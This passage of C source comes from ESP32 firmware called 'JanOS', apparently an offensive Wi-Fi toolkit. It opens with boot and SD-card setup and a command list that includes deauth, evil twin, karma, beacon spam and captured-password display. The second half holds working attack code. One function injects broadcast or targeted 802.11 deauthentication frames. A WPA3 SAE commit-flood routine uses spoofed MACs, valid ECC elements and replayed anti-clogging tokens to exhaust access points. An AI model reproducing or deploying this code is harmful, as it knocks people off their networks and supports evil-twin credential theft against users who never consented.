            //printf("Malloc from PSRAM succeeded\n");
            heap_caps_free(ptr);
        } else {
            printf("Malloc from PSRAM failed\n");
        }
        
        //printf("Step 2b: Allocate buffers in PSRAM\n");
        if (!init_psram_buffers()) {
            printf("FATAL: PSRAM buffer allocation failed!\n");
            return;
        }
        //printf("PSRAM buffers allocated (~110 KB)\n");
    } else {
        printf("PSRAM init failed: %s (continuing without PSRAM)\n", esp_err_to_name(ret1));
    }
#else
    printf("PSRAM support disabled in config\n");
#endif

    // NVS must be ready before loading persisted display mode.
    ESP_ERROR_CHECK(nvs_flash_init());
    display_mode_load_from_nvs();
    oled_display_set_forced_type(display_forced_mode);
    MY_LOG_INFO(TAG, "Display mode configured: %s", display_mode_to_str(display_forced_mode));

    // Initialize display module (auto-detect SSD1306 / SH1107 / SH1106 / Unit LCD)
    oled_display_init();
    {
        const char *display_name = "NONE";
        char display_desc[64];
        int disp_addr7 = oled_display_get_i2c_addr_7bit();
        int disp_addr_raw = oled_display_get_i2c_addr_raw();
        snprintf(display_desc, sizeof(display_desc), "not detected");
        switch (oled_display_get_type()) {
            case DISPLAY_SSD1306:
                display_name = "SSD1306";
                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
                         disp_addr_raw, disp_addr7);
                break;
            case DISPLAY_SH1107:
                display_name = "SH1107";
                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
                         disp_addr_raw, disp_addr7);
                break;
            case DISPLAY_SH1106:
                display_name = "SH1106";
                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
                         disp_addr_raw, disp_addr7);
                break;
            case DISPLAY_UNIT_LCD:
                display_name = "UNIT_LCD";
                snprintf(display_desc, sizeof(display_desc), "addr 0x%02X", disp_addr7);
                break;
            case DISPLAY_NONE:
            default:
                display_name = "NONE";
                snprintf(display_desc, sizeof(display_desc), "check display wiring / I2C");
                break;
        }
        MY_LOG_INFO(TAG, "Display auto-detect: %s (%s)", display_name, display_desc);
    }
    oled_display_update_full("> JanOS v" JANOS_VERSION, "  Booting...", "", "");
    vTaskDelay(pdMS_TO_TICKS(80));

//     printf("Step 3: Init NVS\n");
    ota_load_channel_from_nvs();
    wpasec_load_key_from_nvs();
    wigle_load_key_from_nvs();
    wdgwars_load_key_from_nvs();
    ota_mark_valid_if_pending();
    ota_log_boot_info();
    {
        const char *display_name = "NONE";
        char display_desc[64];
        int disp_addr7 = oled_display_get_i2c_addr_7bit();
        int disp_addr_raw = oled_display_get_i2c_addr_raw();
        snprintf(display_desc, sizeof(display_desc), "not detected");
        switch (oled_display_get_type()) {
            case DISPLAY_SSD1306:
                display_name = "SSD1306";
                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
                         disp_addr_raw, disp_addr7);
                break;
            case DISPLAY_SH1107:
                display_name = "SH1107";
                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
                         disp_addr_raw, disp_addr7);
                break;
            case DISPLAY_SH1106:
                display_name = "SH1106";
                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
                         disp_addr_raw, disp_addr7);
                break;
            case DISPLAY_UNIT_LCD:
                display_name = "UNIT_LCD";
                snprintf(display_desc, sizeof(display_desc), "addr 0x%02X", disp_addr7);
                break;
            case DISPLAY_NONE:
            default:
                display_name = "NONE";
                snprintf(display_desc, sizeof(display_desc), "check display wiring / I2C");
                break;
        }
        MY_LOG_INFO(TAG, "POST Display auto-detect: %s (%s)", display_name, display_desc);
    }
    //printf("NVS initialized OK\n");

    channel_time_load_state_from_nvs();
    gps_load_state_from_nvs();
    led_load_state_from_nvs();
    oled_display_update_full(NULL, "  NVS: OK", "  Init LED...", "");
    vTaskDelay(pdMS_TO_TICKS(60));
    MY_LOG_INFO(TAG, "GPS module: %s (baud %d)",
                gps_get_module_name(current_gps_module),
                gps_get_baud_for_module(current_gps_module));

    //printf("Step 4: Init LED strip\n");
    // 1. LED strip configuration
    led_strip_config_t strip_cfg = {
        .strip_gpio_num            = NEOPIXEL_GPIO,
        .max_leds                  = LED_COUNT,
        .led_model                 = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
        .flags.invert_out          = false,
    };

    // 2. LED Strip RMT configuration
    led_strip_rmt_config_t rmt_cfg = {
        .clk_src        = RMT_CLK_SRC_DEFAULT,
        .resolution_hz  = RMT_RES_HZ,
        .flags.with_dma = false,
    };

    // 3. strip instance (non-fatal on failure)
    esp_err_t led_init_err = led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &strip);
    if (led_init_err != ESP_OK) {
        ESP_LOGE(TAG, "LED strip init failed on GPIO %d (model %s): %s",
                 strip_cfg.strip_gpio_num,
                 "WS2812",
                 esp_err_to_name(led_init_err));
        strip = NULL;
        led_initialized = false;
    } else {
        led_initialized = true;
        led_boot_sequence();
    }
    //printf("Step 6: Vendor load state\n");
    MY_LOG_INFO(TAG, "Status LED ready (brightness %u%%, %s)", led_brightness_percent, led_user_enabled ? "on" : "off");
    oled_display_update_full(NULL, "  NVS: OK", "  LED: OK", "  Init SD...");
    vTaskDelay(pdMS_TO_TICKS(60));
    vendor_load_state_from_nvs();
    vendor_last_valid = false;
    vendor_last_hit = false;
    vendor_lookup_buffer[0] = '\0';
    vendor_file_checked = false;
    vendor_file_present = false;
    vendor_record_count = 0;
    //printf("Step 7: Boot config load\n");
    boot_config_load_from_nvs();

    // Note: WiFi and BLE are initialized lazily on first command that needs them
    // This saves memory and allows SD card to work properly
    //printf("Radio init: deferred (lazy initialization)\n");
    
    // Show memory status at boot
    log_memory_info("BOOT");

    MY_LOG_INFO(TAG,"JanOS version: " JANOS_VERSION);


    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    // Keep REPL stable for heavier TLS-based commands triggered directly from CLI.
    repl_config.task_stack_size = 8192;
     MY_LOG_INFO(TAG,"");
    MY_LOG_INFO(TAG,"Available commands:");
      MY_LOG_INFO(TAG,"  add_ssid <SSID>");
      MY_LOG_INFO(TAG,"  arp_ban <MAC> [IP]");
      MY_LOG_INFO(TAG,"  boot_button read|list|set|status");
      MY_LOG_INFO(TAG,"  channel_time set <min|max> <ms> | channel_time read <min|max>");
      MY_LOG_INFO(TAG,"  channel_view");
      MY_LOG_INFO(TAG,"  clear_sniffer_results");
      MY_LOG_INFO(TAG,"  deauth_detector");
      MY_LOG_INFO(TAG,"  display set <auto|ssd1306|sh1107|sh1106|unit_lcd> | display read");
      MY_LOG_INFO(TAG,"  download");
      MY_LOG_INFO(TAG,"  file_delete <path>");
      MY_LOG_INFO(TAG,"  gps_set <m5|atgm|external|cap>");
      MY_LOG_INFO(TAG,"  help");
      MY_LOG_INFO(TAG,"  led set <on|off> | led level <1-100> | led read");
      MY_LOG_INFO(TAG,"  list_dir <path>");
      MY_LOG_INFO(TAG,"  list_hosts");
      MY_LOG_INFO(TAG,"  list_hosts_vendor");
      MY_LOG_INFO(TAG,"  list_probes");
      MY_LOG_INFO(TAG,"  list_probes_vendor");
      MY_LOG_INFO(TAG,"  list_sd");
      MY_LOG_INFO(TAG,"  list_ssid");
      MY_LOG_INFO(TAG,"  list_ssids");
      MY_LOG_INFO(TAG,"  ota_boot <ota_0|ota_1>");
      MY_LOG_INFO(TAG,"  ota_channel [main|dev]");
      MY_LOG_INFO(TAG,"  ota_check");
      MY_LOG_INFO(TAG,"  ota_info");
      MY_LOG_INFO(TAG,"  ota_list");
      MY_LOG_INFO(TAG,"  packet_monitor <channel>");
      MY_LOG_INFO(TAG,"  ping");
      MY_LOG_INFO(TAG,"  reboot");
      MY_LOG_INFO(TAG,"  remove_ssid <index>");
      MY_LOG_INFO(TAG,"  sae_overflow");
      MY_LOG_INFO(TAG,"  save_handshake");
      MY_LOG_INFO(TAG,"  scan_airtag");
      MY_LOG_INFO(TAG,"  scan_bt");
      MY_LOG_INFO(TAG,"  scan_networks");
      MY_LOG_INFO(TAG,"  select_html <index>");
      MY_LOG_INFO(TAG,"  select_networks <index1> [index2] ...");
      MY_LOG_INFO(TAG,"  select_stations <MAC1> [MAC2] ...");
      MY_LOG_INFO(TAG,"  set_gps_position <lat> <lon> [alt] [acc]");
      MY_LOG_INFO(TAG,"  set_gps_position_cap <lat> <lon> [alt] [acc]");
      MY_LOG_INFO(TAG,"  set_html <html>");
      MY_LOG_INFO(TAG,"  show_pass [portal|evil]");
      MY_LOG_INFO(TAG,"  show_probes");
      MY_LOG_INFO(TAG,"  show_probes_vendor");
      MY_LOG_INFO(TAG,"  show_scan_results");
      MY_LOG_INFO(TAG,"  show_sniffer_results");
      MY_LOG_INFO(TAG,"  show_sniffer_results_vendor");
      MY_LOG_INFO(TAG,"  sniffer_debug <0|1>");
      MY_LOG_INFO(TAG,"  start_beacon_spam \"SSID1\" \"SSID2\" ...");
      MY_LOG_INFO(TAG,"  start_beacon_spam_ssids");
      MY_LOG_INFO(TAG,"  start_blackout");
      MY_LOG_INFO(TAG,"  start_deauth");
      MY_LOG_INFO(TAG,"  start_evil_twin");
      MY_LOG_INFO(TAG,"  start_gps_raw");
      MY_LOG_INFO(TAG,"  start_handshake [index1] [index2] ...");
      MY_LOG_INFO(TAG,"  start_karma <index>");
      MY_LOG_INFO(TAG,"  start_nmap [quick|medium|heavy] [IP]");
      MY_LOG_INFO(TAG,"  start_portal <SSID>");
      MY_LOG_INFO(TAG,"  start_rogueap <SSID> <password>");
      MY_LOG_INFO(TAG,"  start_sniffer");
      MY_LOG_INFO(TAG,"  start_sniffer_dog");
      MY_LOG_INFO(TAG,"  start_sniffer_noscan");
      MY_LOG_INFO(TAG,"  start_wardrive");
      MY_LOG_INFO(TAG,"  start_wardrive_promisc");
      MY_LOG_INFO(TAG,"  start_wardrive_promisc_trace");
      MY_LOG_INFO(TAG,"  stop");
      MY_LOG_INFO(TAG,"  unselect_networks");
      MY_LOG_INFO(TAG,"  unselect_stations");
      MY_LOG_INFO(TAG,"  vendor set <on|off> | vendor read");
      MY_LOG_INFO(TAG,"  version");
      MY_LOG_INFO(TAG,"  wifi_connect <SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
      MY_LOG_INFO(TAG,"  wifi_disconnect");
      MY_LOG_INFO(TAG,"  wdgwars_key set <key> | wdgwars_key read");
      MY_LOG_INFO(TAG,"  wdgwars_upload");
      MY_LOG_INFO(TAG,"  wigle_key set <api_name> <api_token> | wigle_key read");
      MY_LOG_INFO(TAG,"  wigle_upload");
      MY_LOG_INFO(TAG,"  wpasec_key set <key> | wpasec_key read");
      MY_LOG_INFO(TAG,"  wpasec_upload");

    repl_config.prompt = ">";
    repl_config.max_cmdline_length = 100;

    esp_console_register_help_command();
    register_commands();

    esp_console_dev_uart_config_t hw_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&hw_config, &repl_config, &repl));

    linenoiseSetHintsCallback((linenoiseHintsCallback *)&janos_console_hint);

    ESP_ERROR_CHECK(esp_console_start_repl(repl));
    vTaskDelay(pdMS_TO_TICKS(500));

    gpio_config_t boot_button_config = {
        .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO,
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };
    ESP_ERROR_CHECK(gpio_config(&boot_button_config));

    if (boot_button_task_handle == NULL) {
        BaseType_t boot_task_created = xTaskCreate(
            boot_button_task,
            "boot_button",
            BOOT_BUTTON_TASK_STACK_SIZE,
            NULL,
            BOOT_BUTTON_TASK_PRIORITY,
            &boot_button_task_handle
        );
        if (boot_task_created != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create boot button task");
            boot_button_task_handle = NULL;
        }
    }
    
    // Initialize SD card and create necessary directories
    esp_err_t sd_init_ret = init_sd_card();
    if (sd_init_ret == ESP_OK) {
        create_sd_directories();
        report_ssid_file_status();
        ensure_ssids_file();
        if (vendor_is_enabled()) {
            ensure_vendor_file_checked();
        }
        // Check for wpa-sec API key file on SD card
        {
            FILE *wf = fopen("/sdcard/lab/wpa-sec.txt", "r");
            if (wf) {
                static char line[256];
                memset(line, 0, sizeof(line));
                if (fgets(line, sizeof(line), wf)) {
                    // Strip trailing newline/carriage return
                    size_t ln = strlen(line);
                    while (ln > 0 && (line[ln - 1] == '\n' || line[ln - 1] == '\r')) {
                        line[--ln] = '\0';
                    }
                    if (ln > 0) {
                        if (wpasec_save_key_to_nvs(line)) {
                            MY_LOG_INFO(TAG, "wpa-sec key updated from SD card into NVS.");
                        } else {
                            MY_LOG_INFO(TAG, "Failed to save wpa-sec key from SD card to NVS.");
                        }
                    }
                }
                fclose(wf);
            }
        }
        // Check for WiGLE API credentials file on SD card (format: api_name:api_token)
        {
            FILE *wf = fopen("/sdcard/lab/wigle.txt", "r");
            if (wf) {
                static char line[256];
                memset(line, 0, sizeof(line));
                if (fgets(line, sizeof(line), wf)) {
                    static char api_name[WIGLE_KEY_MAX_LEN];
                    static char api_token[WIGLE_KEY_MAX_LEN];
                    memset(api_name, 0, sizeof(api_name));
                    memset(api_token, 0, sizeof(api_token));
                    if (wigle_split_key_pair(line, api_name, sizeof(api_name), api_token, sizeof(api_token))) {
                        if (wigle_save_key_to_nvs(api_name, api_token)) {
                            snprintf(wigle_api_name, sizeof(wigle_api_name), "%s", api_name);
                            snprintf(wigle_api_token, sizeof(wigle_api_token), "%s", api_token);
                            MY_LOG_INFO(TAG, "WiGLE key updated from SD card into NVS.");
                        } else {
                            MY_LOG_INFO(TAG, "Failed to save WiGLE key from SD card to NVS.");
                        }
                    } else {
                        MY_LOG_INFO(TAG, "Invalid /sdcard/lab/wigle.txt format. Expected: api_name:api_token");
                    }
                }
                fclose(wf);
            }
        }
        // Check for WDGWars API key file on SD card (format: one line, 64-char key)
        {
            FILE *wf = fopen("/sdcard/lab/wdgwars.txt", "r");
            if (wf) {
                static char line[128];
                memset(line, 0, sizeof(line));
                if (fgets(line, sizeof(line), wf)) {
                    size_t ln = strlen(line);
                    while (ln > 0 && (line[ln - 1] == '\n' || line[ln - 1] == '\r' || isspace((unsigned char)line[ln - 1]))) {
                        line[--ln] = '\0';
                    }
                    while (*line && isspace((unsigned char)*line)) {
                        memmove(line, line + 1, strlen(line));
                    }
                    if (line[0] != '\0') {
                        if (strlen(line) >= WDGWARS_KEY_MAX_LEN) {
                            MY_LOG_INFO(TAG, "Invalid /sdcard/lab/wdgwars.txt format. Expected one API key (max %d chars).", WDGWARS_KEY_MAX_LEN - 1);
                        } else if (wdgwars_save_key_to_nvs(line)) {
                            strncpy(wdgwars_api_key, line, sizeof(wdgwars_api_key) - 1);
                            wdgwars_api_key[sizeof(wdgwars_api_key) - 1] = '\0';
                            MY_LOG_INFO(TAG, "WDGWars key updated from SD card into NVS.");
                        } else {
                            MY_LOG_INFO(TAG, "Failed to save WDGWars key from SD card to NVS.");
                        }
                    }
                }
                fclose(wf);
            }
        }
        oled_display_update_full(NULL, "  SD: mounted", "  All systems OK", "");
    } else {
        MY_LOG_INFO(TAG, "");
        MY_LOG_INFO(TAG, "SD init error: %s", esp_err_to_name(sd_init_ret));
        MY_LOG_INFO(TAG, "SD Card not detected. Custom portals won't be available, results won't be written to files.");
        MY_LOG_INFO(TAG, "");
        oled_display_update_full(NULL, "  SD: MISSING!", "  No file save", "");
    }
    vTaskDelay(pdMS_TO_TICKS(400));
    
    // Load BSSID whitelist from SD card
    load_whitelist_from_sd();
    vTaskDelay(pdMS_TO_TICKS(500));
    MY_LOG_INFO(TAG,"BOARD READY");
    oled_display_update_full("> JanOS v" JANOS_VERSION,
                            sd_init_ret == ESP_OK ? "  SD: OK" : "  SD: MISSING!",
                            "",
                            "  > Ready _");
    vTaskDelay(pdMS_TO_TICKS(100));
    
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
    if (applicationState == EVIL_TWIN_PASS_CHECK ) {
        ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here..");
        return;
    }

    //proceed with deauth frames on channels of the APs:
    // Use target_bssids[] directly to avoid index confusion after periodic re-scan
    for (int i = 0; i < target_bssid_count; ++i) {
        if (applicationState == EVIL_TWIN_PASS_CHECK ) {
            ESP_LOGW(TAG, "Checking for password...");
            return;
        }
        
        // Check for stop request
        if (operation_stop_requested) {
            ESP_LOGW(TAG, "Deauth: Stop requested, terminating...");
            return;
        }

        if (!target_bssids[i].active) continue;
        
        // Check if BSSID is whitelisted - but ONLY during blackout attack, not during regular deauth
        if (blackout_attack_active && is_bssid_whitelisted(target_bssids[i].bssid)) {
            // MY_LOG_INFO(TAG, "Skipping whitelisted BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
            //            target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
            //            target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5]);
            continue;
        }
        
        // During evil twin with connected clients, only attack networks on same channel as first selected network
        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
            uint8_t first_network_channel = target_bssids[0].channel; // First selected network's channel
            if (target_bssids[i].channel != first_network_channel) {
                // Skip networks on different channels when clients are connected
                continue;
            }
            // Only send deauth on same channel - no channel switch needed since we're already on this channel
        }
        
        // Enhanced logging to debug BSSID mismatch issue
        // MY_LOG_INFO(TAG, "DEAUTH: Sending to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X (target_bssids[%d])",
        //         target_bssids[i].ssid, target_bssids[i].channel,
        //         target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
        //         target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], i);
        
        // If no clients connected or not evil twin mode, do normal channel hopping
        if (portal_connected_clients == 0 || applicationState != DEAUTH_EVIL_TWIN) {
            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
            esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE );
            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
        }

        // If stations are selected AND we're in regular DEAUTH mode (not evil_twin/blackout), send targeted deauth
        if (selected_stations_count > 0 && applicationState == DEAUTH) {
            for (int s = 0; s < selected_stations_count; s++) {
                if (!selected_stations[s].active) continue;
                
                uint8_t deauth_frame[sizeof(deauth_frame_default)];
                memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
                // Set destination to specific station (not broadcast!)
                memcpy(&deauth_frame[4], selected_stations[s].mac, 6);
                memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
                memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
                wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
            }
        } else {
            // Broadcast deauth (original behavior)
            uint8_t deauth_frame[sizeof(deauth_frame_default)];
            memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
            memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
            memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        }
        
        // If clients are connected during evil twin, immediately return to first network's channel
        // This ensures we're on the correct channel when clients try to connect to the portal
        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
            uint8_t first_network_channel = target_bssids[0].channel;
            esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
        }
    }
    
    // After sending all deauth frames, always return to first network's channel during evil twin
    // This maximizes probability of being on correct channel when clients try to connect
    if ((applicationState == DEAUTH_EVIL_TWIN) && target_bssid_count > 0) {
        uint8_t first_network_channel = target_bssids[0].channel;
        esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
    }

}

//SAE WPA3 attack methods:

static int trng_random_callback(void *ctx, unsigned char *output, size_t len) {
    (void)ctx;
    esp_fill_random(output, len);
    return 0;
}

static int crypto_init(void) {
    int ret;
    const char *pers = "dragon_drain";

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    // TRNG as entropy source
    ret = mbedtls_ctr_drbg_seed(&ctr_drbg,
                             trng_random_callback,
                             NULL,
                             (const unsigned char *) pers, strlen(pers));

    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ctr_drbg_seed failed: %d", ret);
        return ret;
    }

    mbedtls_ecp_group_init(&ecc_group);
    mbedtls_ecp_point_init(&ecc_element);
    mbedtls_mpi_init(&ecc_scalar);

    ret = mbedtls_ecp_group_load(&ecc_group, MBEDTLS_ECP_DP_SECP256R1);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_group_load failed: %d", ret);
        return ret;
    }

    ESP_LOGI(TAG, "Crypto context initialized with TRNG (secp256r1)");
    return 0;
}

/*
 * Random MAC for client overflow attack.
 */
static void update_spoofed_src_random(void) {
    esp_err_t ret = mbedtls_ctr_drbg_random(&ctr_drbg, spoofed_src, 6);
    if (ret != 0) {
        ESP_LOGE(TAG, "Unable to generate random MAC: %d", ret);
        return;
    }

    spoofed_src[0] &= 0xFE;  // bit multicast = 0
    spoofed_src[0] |= 0x02;  // locally administered = 1

    next_src = (next_src + 1) % NUM_CLIENTS;
}

// SAE Overflow attack task function (runs in background)
static void sae_attack_task(void *pvParameters) {
    wifi_ap_record_t *ap_record = (wifi_ap_record_t *)pvParameters;
    
    MY_LOG_INFO(TAG, "SAE overflow task started.");
    
    prepareAttack(*ap_record);
    int frame_count_check = 0;
    
    while (sae_attack_active) {
        // Check for stop request (check every 10 frames for better responsiveness)
        if (frame_count_check % 10 == 0) {
            if (operation_stop_requested || !sae_attack_active) {
                MY_LOG_INFO(TAG, "SAE overflow: Stop requested, terminating...");
                operation_stop_requested = false;
                sae_attack_active = false;
                applicationState = IDLE;
                
                // Clean up after attack
                esp_wifi_set_promiscuous(false);
                
                // Restore LED to idle (ignore errors if LED is in invalid state)
                esp_err_t led_err = led_set_idle();
                if (led_err != ESP_OK) {
                    ESP_LOGW(TAG, "Failed to restore idle LED after SAE stop: %s", esp_err_to_name(led_err));
                }
                
                break;
            }
            
            // Yield to allow UART console processing every 10 frames
            taskYIELD();
        }
        
        inject_sae_commit_frame();
        
        if (frame_count_check % 20 == 0) {
            char sae_l2[64], sae_l3[64];
            snprintf(sae_l2, sizeof(sae_l2), ">> %s", (const char *)ap_record->ssid);
            snprintf(sae_l3, sizeof(sae_l3), "  Frames: %d", frame_count_check);
            oled_display_update_full("> SAE Flood", sae_l2, sae_l3, "  WPA3 Overflow");
        }
        
        // Delay to allow UART console processing (50ms gives better responsiveness)
        vTaskDelay(pdMS_TO_TICKS(50));
        frame_count_check++;
    }
    
    // Clean up LED after attack finishes naturally (ignore LED errors)
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after SAE task: %s", esp_err_to_name(led_err));
    }
    
    // Clean up after attack
    esp_wifi_set_promiscuous(false);
    
    sae_attack_active = false;
    sae_attack_task_handle = NULL;
    MY_LOG_INFO(TAG, "SAE overflow task finished.");
    
    // Free the allocated memory for ap_record
    free(pvParameters);
    
    vTaskDelete(NULL); // Delete this task
}

/*
Injects SAE Commit frame with spoofed source address.
This function generates a random scalar, computes the corresponding ECC point,
and constructs the SAE Commit frame with the spoofed source address.
 */

void inject_sae_commit_frame() {
    uint8_t buf[256];  
    memset(buf, 0, sizeof(buf));
    memcpy(buf, auth_req_sae_commit_header, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
    memcpy(buf + 4, bssid, 6);
    memcpy(buf + 10, spoofed_src, 6);
    memcpy(buf + 16, bssid, 6);

    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;  // Placeholder: scalar size

    uint8_t *pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
    int ret;
    size_t scalar_size = 32;

    do {
        ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, mbedtls_ctr_drbg_random, &ctr_drbg);
        if (ret != 0) {
            ESP_LOGE(TAG, "mbedtls_mpi_fill_random failed: %d", ret);
            return;
        }
    } while (mbedtls_mpi_cmp_int(&ecc_scalar, 0) <= 0 ||
             mbedtls_mpi_cmp_mpi(&ecc_scalar, &ecc_group.N) >= 0);

    ret = mbedtls_mpi_write_binary(&ecc_scalar, pos, scalar_size);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_mpi_write_binary failed: %d", ret);
        return;
    }
    pos += scalar_size;

    ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, mbedtls_ctr_drbg_random, &ctr_drbg);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_mul failed: %d", ret);
        return;
    }

    uint8_t point_buf[65];
    size_t point_len = 0;
    ret = mbedtls_ecp_point_write_binary(&ecc_group, &ecc_element, MBEDTLS_ECP_PF_UNCOMPRESSED, &point_len, point_buf, sizeof(point_buf));
    if (ret != 0 || point_len != 65) {
        ESP_LOGE(TAG, "mbedtls_ecp_point_write_binary failed: %d", ret);
        return;
    }

    memcpy(pos, point_buf + 1, 64);  // skip 0x04 prefix
    pos += 64;

    // Append token:
    if (actLength > 0 && anti_clogging_token != NULL) {
        *pos++ = 0x4C;           // EID
        *pos++ = actLength;      // Length

        memcpy(pos, anti_clogging_token, actLength);
        pos += actLength;
    }

    // Refresh MAC
    update_spoofed_src_random();

    size_t total_len = pos - buf;


    esp_err_t ret_tx = esp_wifi_80211_tx(WIFI_IF_STA, buf, total_len, false);
    if (ret_tx != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_80211_tx failed: %s", esp_err_to_name(ret_tx));
    } else {
        //log the frame:
        //ESP_LOGD(TAG, "Injecting SAE Commit frame, total length: %d bytes", total_len);
        // for (size_t i = 0; i < total_len; i++) {
        //     printf("%02X ", buf[i]);
        // }
        //printf("\n");
        // Send the frame
    }

    if (frame_count == 0) start_time = esp_timer_get_time();
    frame_count++;

    if (frame_count >= 100) {
        int64_t now = esp_timer_get_time();
        double seconds = (now - start_time) / 1e6;
        double fps = frame_count / seconds;
        
        // Debug logging only (disabled by default to avoid UART spam)
        ESP_LOGD(TAG, "SAE Overflow: AVG FPS: %.2f", fps);
        
        framesPerSecond = (int)fps;
        frame_count = 0;
        if (framesPerSecond == 0) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}


void prepareAttack(const wifi_ap_record_t ap_record) {

    esp_wifi_set_channel(ap_record.primary, WIFI_SECOND_CHAN_NONE );

    //globalDataCount = 1;
    //globalData[0] = strdup((char *)ap_record.ssid);
    memcpy(spoofed_src, base_srcaddr, 6);
    memcpy(bssid, ap_record.bssid, sizeof(bssid));
    next_src = 0;
    if (crypto_init() != 0) {
        ESP_LOGE(TAG, "Crypto initialization failed");
        return;
    }

    //Enable promiscuous mode in order to listen to SAE Commit frames
    ESP_LOGI(TAG, "Enabling promiscuous mode for SAE Commit frames");
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_callback_v1);
    esp_wifi_set_promiscuous(true);

}

void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MGMT) {
        parse_sae_commit((const wifi_promiscuous_pkt_t *)buf);
    }
}


static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *buf = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    // Ignore retransmission:
    if (buf[1] & 0x08) return;


    int tods_fromds = buf[1] & 0x03;
    int pos_bssid = 0, pos_src = 0;

    switch (tods_fromds) {
        case 0:
            pos_bssid = 16; pos_src = 10;  break;
        case 1:
            pos_bssid = 4;  pos_src = 10;  break;
        case 2:
            pos_bssid = 10; pos_src = 16;  break;
        default:
            pos_bssid = 10; pos_src = 24;  break;
    }

    // Check if the frame is addressed to the target BSSID
    if (memcmp(buf + pos_bssid, bssid, 6) != 0 ||
        memcmp(buf + pos_src, bssid, 6) != 0)
        return;

    // Beacon detection 
    if (buf[0] == 0x80) {
        //ESP_LOGI(TAG, "Beacon detected from AP");
        return;
    }

    // Searching for SAE Commit
    if (len > 32 && buf[0] == 0xB0 && buf[24] == 0x03 && buf[26] == 0x01) {
        if (buf[28] == 0x4C) {
            const uint8_t *token = buf + 32;
            int token_len = len - 32;

            if (anti_clogging_token) free(anti_clogging_token);
            anti_clogging_token = malloc(token_len);
            if (!anti_clogging_token) {
                ESP_LOGE(TAG, "Mem error: Unable to allocate memory for anti_clogging_token");
                actLength = 0;
                return;
            }

            memcpy(anti_clogging_token, token, token_len);
            actLength = token_len;

            char token_str[token_len * 3 + 1];
            for (int i = 0; i < token_len; i++)
                sprintf(&token_str[i * 3], "%02X ", token[i]);
            token_str[token_len * 3] = '\0';

            //ESP_LOGI(TAG, "  Token: %s", token_str);
        } else if (buf[28] == 0x00) {
            //ESP_LOGI(TAG, "SAE Commit without ACT");
        }
    }
}

// === SNIFFER HELPER FUNCTIONS ===

static bool is_multicast_mac(const uint8_t *mac) {
    // IPv6 multicast: 33:33:xx:xx:xx:xx
    if (mac[0] == 0x33 && mac[1] == 0x33) {
        return true;
    }
    // IPv4 multicast: 01:00:5e:xx:xx:xx
    if (mac[0] == 0x01 && mac[1] == 0x00 && mac[2] == 0x5e) {
        return true;
